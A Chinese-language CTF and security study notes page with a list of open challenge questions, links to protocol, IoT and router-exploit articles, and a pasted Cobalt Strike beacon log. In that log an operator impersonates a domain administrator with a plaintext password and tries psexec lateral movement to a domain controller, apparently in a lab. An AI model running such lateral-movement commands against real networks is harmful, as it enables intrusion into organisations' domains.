## Q & A 提问
- FAQ.one
- Windows 本地怎样启环境 运行 angr，像 linux 启动 pwn 题目那样。。想迷宫爆破。 -- 想 win 下启动迷宫题目支持 nc/telnet 连接
- web JustUpload-v2  反序列化
- web burpsuite ,intruder Filter输入中文。显示为乱码且无法过滤。
- png_4 题目怎么做
- 你文件没了快打钱.zip -- smc 题目 ， 1.多次运行后 sp 错误。 2.怎样解码后 patch 出来。并且能运行。
- my_asm 怎样重写为asm并编译运行
- re怎样将ELF修改为无随机地址
- fmtarg ($ecx) 怎么写用 ecx
- Misc  run.zip 有密码的什么东西
  -  Challenges\@todo 1.png
  - 失窃的MP4文件-file2.pcap.zip
- re: 鹏城锦标赛\工控-驱动\drive.zip
- re: ida: IDAPython： Introduction to choosers [VkysIhG_luI].mkv 中的22:45 是怎样保存后即时运行到ida的
- re_iot: 钢铁行业锦标赛\06firmware_reverse
- pwn:  为什么patchelf后不能运行 _怎么办？
- pwn: pwntools怎样设置编码来输出中文 shctf call_call_would_backdoor。

### cobalt strike

- 都有权限浏览域控，为啥不能上线？

```sh
beacon> make_token tide1\administrator 1qaz@WSX
[*] Tasked beacon to create a token for tide1\administrator
beacon> jump psexec DC smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_ce) on DC via Service Control Manager (\\DC\ADMIN$\cc76326.exe)
[+] host called home, sent: 287632 bytes
[+] Impersonated T1-COMPUTER\test
[-] could not upload file: 53
[-] Could not open service control manager on DC: 1722
[-] Could not connect to pipe: 53
beacon> ls \\192.168.61.129\C$
[*] Tasked beacon to list files in \\192.168.61.129\C$
[+] host called home, sent: 37 bytes
[*] Listing: \\192.168.61.129\C$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     06/19/2023 06:28:52   $Recycle.Bin
          dir     06/19/2023 22:13:56   001.env.python-3.5.1-embed-amd64
```

## 综合利用

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## TODO

exec 更改标准输入到 test
exec 1>test
whoami
cat test

# Articles

## QQ 群

829089482 赛事群

## 协议分析/Protocol/IoT

- [MQTT 安全分析](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247492664&idx=1&sn=e18c8c1e7209f6bacddb85397eab85c9)

- [协议分析 | 简析 ARP 欺骗](https://mp.weixin.qq.com/s/WyFPxxjSLF-diSUA-cTRZA)
- [协议分析 | 对一个 apk 协议的继续分析—libsgmain 反混淆与逆向](https://mp.weixin.qq.com/s/s06dvT056fqkENIYoEHZ3w)
- [协议分析 | 【app 渗透】破解 apk app 协议 测试接口等安全](https://mp.weixin.qq.com/s/jAzwLDjrIWhGSSYcA1PyYw)
- [协议分析 | SNMP | 手把手玩转路由器漏洞挖掘系列 - SNMP协议分析](https://mp.weixin.qq.com/s/cceDMM4dJbC_IpexrMO8jg)
- [TLS 1.2 协议解析流程学习（一）](https://mp.weixin.qq.com/s/DS3ZMVSlHvIV0wIDrrmHpg)
- [HLS 无损下载 B 站直播 | HLS 协议从入门到实践](https://www.bilibili.com/video/BV1yL411k7DK/)
- [USB | USB基础知识介绍](https://mp.weixin.qq.com/s/i9tJ1gMOyGiw-wwQQ-g_-w)
- [USB | 用协议分析仪直观理解USB传输的核心概念](https://mp.weixin.qq.com/s/FXM1Kf0KCaVPEJapLysj3Q)

- [蓝牙 | bluetooth | 协议分析 | Bluetooth 蓝牙协议栈技术初探](https://mp.weixin.qq.com/s/1pG6jnvt3aqPrz5Vl6FIqg)
- [蓝牙 | bluetooth | 基于树莓派的蓝牙协议抓包](https://mp.weixin.qq.com/s/ftaqzXcP23ATsCms1qfgHg)
- [蓝牙 | bluetooth | 蓝牙马蹄锁分析过程](https://mp.weixin.qq.com/s/Vrkr9pSr1zPQQJVh9n3PDw)

---

- [IOT 设备常见配置文件加解密分析](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247496354&idx=1&sn=79f02dbebafeb18dfc3e962c489a560f)
- [Openwrt 进程间通信-Ubus](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247494791&idx=1&sn=58ce08c883a7056af29163db8fac83c4)
- [家用智能灯泡的控制功能安全测试](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247497263&idx=1&sn=7cd7b78de1b751434da43238495511c4)
- [CVE-2020-3331 思科 RV110W 路由器命令执行](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247492240&idx=1&sn=8bf9052411b68a17438006e846123cad)
- [EMUX 仿真 RV130 的栈溢出整型利用](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247495867&idx=1&sn=4fd1f76459a06039734f667417b5090f)
- [基于树莓派实现 IOT 流量抓取](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247492289&idx=1&sn=900759780e235368e5ec1ff54f6ac800)
- [固件符号表恢复](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247491846&idx=1&sn=b04846dbd9d5a72601f2469674f3c7d9)

## 网络安全/项目/毕业设计

[科普大作：等保、分保、关保、密评（附下载）](https://mp.weixin.qq.com/s/B6itiRBUkm8dSgX9VGBQgw)
[实验室 2023 届 本科优秀毕业设计展示一——操作系统实践、代码保护](https://mp.weixin.qq.com/s/C_Ias9xu02c1MpQo0CSzRQ)
[实验室 2023 届 本科优秀毕业设计展示二——网络安全](https://mp.weixin.qq.com/s/IIMm-h6Fxota7XfN_07OJg)
[实验室 2023 届 本科优秀毕业设计展示三——安全工具](https://mp.weixin.qq.com/s/UM-gCy9MIw9PQMN7X3ofyg)
[实验室 2023 届 本科优秀毕业设计展示四——应用安全](https://mp.weixin.qq.com/s/-qTDBayECI8i11n-W1GEBg)
[获奖！立项！结题！](https://mp.weixin.qq.com/s/Q6n8JZ1VGdiAnEZNJZdDYw)


## 出题相关/题目设计
[CTF设计的七个经验教训](https://mp.weixin.qq.com/s/jondfZ08dy-NXeTQyzKHsg)